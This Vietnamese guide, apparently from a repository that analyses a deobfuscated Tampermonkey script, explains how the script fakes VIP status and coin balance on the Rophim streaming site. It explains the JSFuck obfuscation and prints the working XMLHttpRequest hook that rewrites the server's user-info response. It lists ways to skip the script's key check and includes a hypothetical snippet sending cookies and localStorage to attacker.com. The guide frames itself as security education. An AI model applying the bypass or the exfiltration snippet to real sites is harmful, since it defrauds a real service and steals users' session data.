# 📘 HƯỚNG DẪN SỬ DỤNG CHI TIẾT

> **Hướng dẫn phân tích code và hiểu cách thức hoạt động của bypass script**

---

## 📋 MỤC LỤC

1. [Cài Đặt Môi Trường](#1-cài-đặt-môi-trường)
2. [Cấu Trúc Dự Án](#2-cấu-trúc-dự-án)
3. [Phân Tích Code Từng Bước](#3-phân-tích-code-từng-bước)
4. [Debug & Testing](#4-debug--testing)
5. [So Sánh Phiên Bản](#5-so-sánh-phiên-bản)
6. [FAQ](#6-faq)

---

## 1. CÀI ĐẶT MÔI TRƯỜNG

### 🔧 Yêu Cầu Hệ Thống

- **Git** (để clone repo)
- **Node.js** (optional - để deobfuscate)
- **Trình duyệt** Chrome/Firefox/Edge
- **Text Editor** VSCode/Sublime/Notepad++

### 📥 Clone Repository

```bash
# Clone repo phân tích
git clone https://github.com/z3rokaze/bypass-rophim.git
cd bypass-rophim

# Xem danh sách file
ls -lh
```

**Kết quả:**
```
-rw-r--r-- 1 user user  19K deobfucated.js          # Code đã giải mã
-rw-r--r-- 1 user user 204K rophim_vip.js           # Code gốc (obfuscated)
-rw-r--r-- 1 user user 869B tampermonkey.user.js   # Userscript
-rw-r--r-- 1 user user 4.3K README.md              # Tài liệu chính
```

---

## 2. CẤU TRÚC DỰ ÁN

### 📁 Chi Tiết Từng File

#### `rophim_vip.js` (207,981 bytes)

**Đặc điểm:**
- ✅ Code gốc đã obfuscated
- ✅ Chỉ có **1 dòng** duy nhất
- ✅ Sử dụng ký tự Unicode (Hangul, Hiragana)
- ✅ Kích thước lớn (~208KB)

**Xem preview:**
```bash
head -c 500 rophim_vip.js
```

**Kết quả:**
```javascript
가=(!![]+[])[0]+([]+{})[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]...
```

---

#### `deobfucated.js` (19,000 bytes)

**Đặc điểm:**
- ✅ Code đã deobfuscate (giải mã)
- ✅ Có **642 dòng** dễ đọc
- ✅ Comment đầy đủ
- ✅ Format chuẩn

**Cấu trúc:**
```javascript
// Dòng 1-360: Dummy functions (20 hàm giả để làm nhiễu)
function authenticateUser() { ... }
function processPayment() { ... }
// ...

// Dòng 361-642: Core logic (Code thật)
(async function () {
  "use strict";
  
  function initBypass() { ... }          // Bypass chính
  function createKeyUI() { ... }         // Tạo giao diện
  function handleKeySubmit() { ... }     // Xác thực key
  // ...
})();
```

---

#### `tampermonkey.user.js` (869 bytes)

**Header metadata:**
```javascript
// @name         Rophim Full VIP
// @version      1.2
// @description  Bypass VIP + Coin trên Rophim
// @author       FireT
// @require      https://raw.githubusercontent.com/.../rophim_vip.js
// @match        *://www.rophim.me/*
// @run-at       document-start
```

**Chức năng:**
- Load `rophim_vip.js` từ GitHub
- Chạy trên các domain Rophim
- Auto-update khi có phiên bản mới

---

## 3. PHÂN TÍCH CODE TỪNG BƯỚC

### BƯỚC 1: Hiểu Obfuscation

#### 🔍 Kỹ Thuật JSFuck

Tạo string từ boolean và object:

```javascript
// Boolean
true           →  !![]
false          →  ![]

// String
"true"         →  (!![]+[])
"false"        →  (![]+[])

// Lấy ký tự
't'            →  (!![]+[])[0]
'r'            →  (!![]+[])[1]
'u'            →  (!![]+[])[2]
'e'            →  (!![]+[])[3]
```

**Ví dụ thực tế từ code:**
```javascript
가 = (!![]+[])[0] + ([]+{})[1] + ...
// 가 = 't' + 'o' + ... → Tạo ra string "toString"
```

#### 🔍 Ký Tự Unicode

```javascript
가, 나, 다, 라, 마, 바, 사, 아, 자, 차  // Hangul (Hàn Quốc)
あ, い, う, え, お, か, き, く, け, こ  // Hiragana (Nhật)
```

**Mục đích:**
- Tên biến khó đọc
- Tránh detect keyword
- Gây khó khăn cho reverse engineering

#### 🔍 URL Encoding

```javascript
// Trong code obfuscated:
%0a  →  \n (newline)
%20  →  space
%42  →  B
%4a  →  J
%50  →  P
```

---

### BƯỚC 2: Phân Tích Core Bypass

#### 📝 Hàm `initBypass()` (Dòng 364-397)

**Mục đích:** Hook XMLHttpRequest để intercept API calls

**Code chi tiết:**

```javascript
function initBypass() {
  // 1. Lưu function gốc
  const open = XMLHttpRequest.prototype.open;
  const send = XMLHttpRequest.prototype.send;

  // 2. Override hàm open() để lưu URL
  XMLHttpRequest.prototype.open = function (method, url) {
    this._url = url;  // Lưu URL vào property _url
    return open.apply(this, arguments);  // Gọi hàm gốc
  };

  // 3. Override hàm send() để sửa response
  XMLHttpRequest.prototype.send = function () {
    this.addEventListener("load", function () {
      try {
        // 4. Kiểm tra URL có phải API user info không
        if (this._url.includes("/v1/user/info")) {
          
          // 5. Parse response JSON
          let data = JSON.parse(this.responseText);
          
          // 6. Sửa đổi data
          data.result.is_vip = true;
          data.result.role = "vip";
          data.result.vip_expires_at = Date.now() + 10 * 365 * 24 * 60 * 60 * 1000;  // +10 năm
          data.result.coin_balance = 999999999;
          data.result.name = "FireT - t.me/ft_bypass";
          
          // 7. Override response property
          Object.defineProperty(this, "responseText", {
            value: JSON.stringify(data),
          });
          Object.defineProperty(this, "response", {
            value: JSON.stringify(data),
          });
        }
      } catch (e) {
        console.error("Error:", e);
      }
    });
    return send.apply(this, arguments);  // Gọi hàm gốc
  };
}
```

**Flow hoạt động:**

```
1. Website gọi: xhr.open("GET", "/v1/user/info")
   ↓
2. Script hook detect URL chứa "/v1/user/info"
   ↓
3. Website gọi: xhr.send()
   ↓
4. Server trả response: { is_vip: false, coin_balance: 100 }
   ↓
5. Script intercept và sửa: { is_vip: true, coin_balance: 999999999 }
   ↓
6. Website nhận response giả → Hiển thị VIP!
```

---

#### 📝 Hàm `handleKeySubmit()` (Dòng 543-583)

**Mục đích:** Xác thực key từ GitHub

**Code chi tiết:**

```javascript
async function handleKeySubmit() {
  const input = document.getElementById("ft-key-input");
  const key = input.value.trim();

  // 1. Validate input
  if (!key) {
    showMessage("Vui lòng nhập key", "error");
    return;
  }

  // 2. Hiển thị loading
  submitBtn.disabled = true;
  submitBtn.innerHTML = '...Đang xác thực...';

  try {
    // 3. Fetch danh sách key từ GitHub
    const res = await fetch(
      "https://raw.githubusercontent.com/firetofficial/zythtool/refs/heads/main/menu/hi"
    );
    const txt = await res.text();

    // 4. Kiểm tra key có trong danh sách không
    if (txt.includes(key)) {
      // 5. Lưu key vào localStorage
      localStorage.setItem("ft_bypass_key", key);
      
      // 6. Hiển thị thành công
      showMessage("✓ Key hợp lệ!", "success");
      
      // 7. Đóng popup sau 2s
      setTimeout(() => {
        overlay.remove();
      }, 2000);
    } else {
      // 8. Key không hợp lệ
      showMessage("✗ Key không hợp lệ", "error");
    }
  } catch (e) {
    // 9. Lỗi network
    showMessage("✗ Không thể xác minh key", "error");
  }
}
```

**Điểm yếu:**
- ❌ Key lưu trong plain text trên GitHub
- ❌ Có thể bypass bằng cách fake localStorage
- ❌ Không có server-side validation

---

#### 📝 Hàm `createKeyUI()` (Dòng 436-524)

**Mục đích:** Tạo popup nhập key đẹp mắt

**UI Components:**

```
┌─────────────────────────────────┐
│         🔑                      │
│   Rophim VIP Bypass             │
├─────────────────────────────────┤
│  💎 Để sử dụng script...        │
│  [Lấy Key tại Telegram]         │
│                                 │
│  ┌─────────────────────┐        │
│  │ Nhập key...         │        │
│  └─────────────────────┘        │
│                                 │
│  ┌─────────────────────┐        │
│  │   Xác thực Key      │        │
│  └─────────────────────┘        │
│                                 │
│  Powered by FireT • v1.2        │
└─────────────────────────────────┘
```

**CSS Features:**
- ✨ Gradient background
- ✨ Backdrop blur
- ✨ Box shadow
- ✨ Smooth animations (fadeIn, slideUp)
- ✨ Responsive design

---

### BƯỚC 3: Phân Tích Dummy Functions

**Mục đích làm nhiễu:** Dòng 1-360 chứa 20 hàm KHÔNG sử dụng

```javascript
function authenticateUser() {
  try {
    return Math.random() * 1000;  // Code vô nghĩa
    var _temp0 = { ... };         // Dead code (unreachable)
    return _temp0;
  } catch (e) {
    return null;
  }
}
```

**Tại sao có dummy code?**
- 🎯 Làm file lớn hơn
- 🎯 Gây nhiễu cho static analysis
- 🎯 Tên hàm giả mạo (authenticateUser, processPayment...)
- 🎯 Người đọc tưởng đó là code quan trọng

**Nhận biết dummy:**
```javascript
// ❌ Dummy - có return trước
return Math.random() * 1000;
var _temp0 = { ... };  // Dòng này không bao giờ chạy

// ✅ Real - code có logic thật
if (this._url.includes("/v1/user/info")) {
  // ... xử lý thật
}
```

---

## 4. DEBUG & TESTING

### 🧪 Test Locally

#### Bước 1: Tạo File HTML Test

```html
<!-- test.html -->
<!DOCTYPE html>
<html>
<head>
  <title>Test Bypass</title>
</head>
<body>
  <h1>Rophim Bypass Test</h1>
  <button onclick="testAPI()">Test API Call</button>
  <div id="result"></div>

  <script src="deobfucated.js"></script>
  <script>
    async function testAPI() {
      // Giả lập API call
      const xhr = new XMLHttpRequest();
      xhr.open("GET", "https://api.rophim.me/v1/user/info");
      
      xhr.onload = function() {
        document.getElementById("result").innerHTML = 
          '<pre>' + this.responseText + '</pre>';
      };
      
      xhr.send();
    }
  </script>
</body>
</html>
```

#### Bước 2: Mở Console

```bash
# Mở file trong browser
firefox test.html
# hoặc
google-chrome test.html
```

#### Bước 3: Check Console

```javascript
// Mở DevTools (F12) → Console
console.log("Script loaded:", typeof initBypass);
// Output: Script loaded: function

// Test hook
XMLHttpRequest.prototype.open.toString()
// Nếu có "this._url = url" → Hook đã active
```

---

### 🔍 Analyze Network Traffic

#### Sử dụng DevTools

1. Mở **DevTools** (F12)
2. Tab **Network**
3. Reload trang
4. Filter: `user/info`
5. Click request → Tab **Response**

**So sánh:**

**KHÔNG có bypass:**
```json
{
  "result": {
    "is_vip": false,
    "coin_balance": 0,
    "role": "user"
  }
}
```

**CÓ bypass:**
```json
{
  "result": {
    "is_vip": true,
    "coin_balance": 999999999,
    "role": "vip",
    "name": "FireT - t.me/ft_bypass"
  }
}
```

---

### 🐛 Debug Obfuscated Code

#### Cách 1: Beautify Online

```bash
# Copy code obfuscated
cat rophim_vip.js | pbcopy

# Paste vào:
https://beautifier.io/
https://prettier.io/playground/

# → Vẫn khó đọc vì obfuscate nặng
```

#### Cách 2: Sử dụng de4js

```bash
# Truy cập
https://lelinhtinh.github.io/de4js/

# Paste code → Select "Auto Decode"
# → Có thể decode một phần
```

#### Cách 3: Manual Deobfuscate

```javascript
// Tìm pattern
[][다][나](...)()

// Tương đương với:
[]['constructor']['constructor'](...)()

// Hay còn gọi là:
Function(...)()

// Ví dụ:
Function('return 1+1')()  // → 2
```

**Kỹ thuật:**
1. Tìm pattern lặp lại
2. Replace từng bước
3. Eval từng đoạn nhỏ để xem output
4. Rebuild code sạch

---

## 5. SO SÁNH PHIÊN BẢN

### 📊 Bảng So Sánh

| Feature | FireT v1.2 | Meliodaspro No-Key | Code Analysis |
|---------|------------|---------------------|---------------|
| **Obfuscation** | ✅ Heavy | ✅ Medium | ❌ None |
| **Key Required** | ✅ Yes | ❌ No | N/A |
| **UI Popup** | ✅ Beautiful | ⚠️ Basic | N/A |
| **Kill Switch** | ✅ Yes | ❌ No | ✅ Analyzed |
| **Auto Update** | ✅ Yes | ✅ Yes | N/A |
| **File Size** | 208KB | ~150KB | 19KB (clean) |
| **Lines** | 1 | ~50 | 642 |
| **Tracking** | ⚠️ Possible | ❌ No | ✅ Documented |

---

### 🔄 Timeline

```
2025-10-15
└─ Meliodaspro fork → Remove key requirement
   
2025-10-26  
└─ FireT update README → Add disclaimer

2025-11-05 (Today)
└─ Code analysis & deobfuscation
```

---

## 6. FAQ

### ❓ Code có an toàn không?

**Trả lời:** Sau khi deobfuscate, **KHÔNG** phát hiện:
- ❌ Keylogger
- ❌ Cookie stealing
- ❌ Data exfiltration
- ❌ XSS injection

**NHƯNG:**
- ⚠️ Có thể update remote thành mã độc
- ⚠️ Tracking qua localStorage
- ⚠️ Kill switch có thể disable bất cứ lúc nào

---

### ❓ Tại sao cần key?

**Trả lời:** 
1. **Kiểm soát người dùng** - Biết ai đang dùng
2. **Monetization** - Có thể bán key
3. **Kill switch** - Tắt từ xa nếu cần
4. **Anti-abuse** - Ngăn spam

---

### ❓ Có thể bypass key không?

**Trả lời:** ✅ CÓ - Nhiều cách:

**Cách 1:** Fake localStorage
```javascript
localStorage.setItem("ft_bypass_key", "any-value");
// Sau đó comment dòng check key
```

**Cách 2:** Modify code
```javascript
// Tìm dòng:
if (txt.includes(key)) {

// Đổi thành:
if (true) {  // Always true
```

**Cách 3:** Dùng version no-key của Meliodaspro

---

### ❓ Làm sao để deobfuscate?

**Trả lời:** Process nhiều bước:

1. **Beautify** code → Format đẹp hơn
2. **Identify patterns** → Tìm pattern lặp
3. **Replace variables** → Đổi tên biến
4. **Decode strings** → Giải mã string encoding
5. **Remove dead code** → Xóa dummy functions
6. **Rename functions** → Đặt tên có nghĩa
7. **Add comments** → Thêm comment giải thích

**Tools:**
- [de4js](https://lelinhtinh.github.io/de4js/)
- [JSNice](http://jsnice.org/)
- [Prettier](https://prettier.io/)
- Manual (tốt nhất!)

---

### ❓ Script có ăn cắp dữ liệu không?

**Trả lời:** Trong code hiện tại - **KHÔNG**

**Nhưng rủi ro:**
```javascript
// Tác giả CÓ THỂ update thành:
fetch("https://attacker.com/collect", {
  method: "POST",
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: localStorage,
    userAgent: navigator.userAgent
  })
});
```

**→ Đó là lý do phải deobfuscate để check!**

---

### ❓ Tại sao obfuscate nặng thế?

**Trả lời:**

**Lý do tác giả đưa ra:**
- Bảo vệ công sức
- Ngăn re-upload
- Ngăn sửa đổi tác giả

**Lý do thực tế:**
- Che giấu cách hoạt động
- Tránh bị detect
- Có thể ẩn mã độc
- User không biết code làm gì

**Quy tắc vàng:**
> Code obfuscate quá mức = Dấu hiệu nguy hiểm!

---

### ❓ Có bị ban không?

**Trả lời:** ⚠️ CÓ NGUY CƠ

**Cách Rophim có thể detect:**
1. **Pattern detection** - Coin balance = 999999999 (quá rõ ràng!)
2. **Behavior analysis** - VIP expire sau 10 năm
3. **Client-side checks** - JS check trước khi gửi server
4. **Server logs** - Phát hiện request bất thường

**Nếu bị detect:**
- Ban tài khoản
- Block IP
- Legal action (trong trường hợp nghiêm trọng)

---

### ❓ Sử dụng có vi phạm pháp luật không?

**Trả lời:** ✅ CÓ

**Vi phạm:**
- 📜 Terms of Service (ToS)
- 📜 Luật Sở hữu trí tuệ
- 📜 Computer Fraud and Abuse Act (nếu ở Mỹ)

**Hậu quả:**
- Ban account
- Kiện dân sự
- Kiện hình sự (nếu damage lớn)

**→ KHÔNG nên sử dụng!**

---

### ❓ Repo này có khuyến khích crack không?

**Trả lời:** ❌ TUYỆT ĐỐI KHÔNG

**Mục đích:**
- ✅ Phân tích kỹ thuật
- ✅ Nghiên cứu bảo mật
- ✅ Giáo dục
- ✅ Cảnh báo

**KHÔNG:**
- ❌ Khuyến khích dùng
- ❌ Hỗ trợ crack
- ❌ Phát tán tool

---

## 📚 TÀI LIỆU THAM KHẢO

### Kỹ Thuật

- [JSFuck](http://www.jsfuck.com/) - Write JS with 6 characters
- [JavaScript Obfuscator](https://obfuscator.io/) - Obfuscate tool
- [de4js](https://lelinhtinh.github.io/de4js/) - Deobfuscate tool
- [XMLHttpRequest Hook](https://blog.0daylabs.com/2016/02/06/hooking-xmlhttprequest/) - Hooking tutorial

### Bảo Mật

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Security Academy](https://portswigger.net/web-security)
- [HackerOne](https://www.hackerone.com/knowledge-center)

### Pháp Lý

- [DMCA](https://www.dmca.com/faq/What-is-DMCA)
- [CFAA](https://www.law.cornell.edu/uscode/text/18/1030)
- [Luật SHTT Việt Nam](https://thuvienphapluat.vn/van-ban/So-huu-tri-tue/Luat-So-huu-tri-tue-2005-50-2005-QH11-11093.aspx)

---

## 🎓 KẾT LUẬN

Qua hướng dẫn này, bạn đã học được:

✅ Cách phân tích code obfuscated  
✅ Kỹ thuật deobfuscation  
✅ Hiểu cách bypass hoạt động  
✅ Rủi ro pháp lý & kỹ thuật  
✅ Tools & techniques cho security research  

**Nhớ rằng:**
> Kiến thức là vũ khí hai lưỡi. Hãy sử dụng có trách nhiệm!

---

<div align="center">

**📖 Made for Education & Security Research**

[![Back to README](https://img.shields.io/badge/←_Back_to-README-blue?style=for-the-badge)](./README.md)

</div>
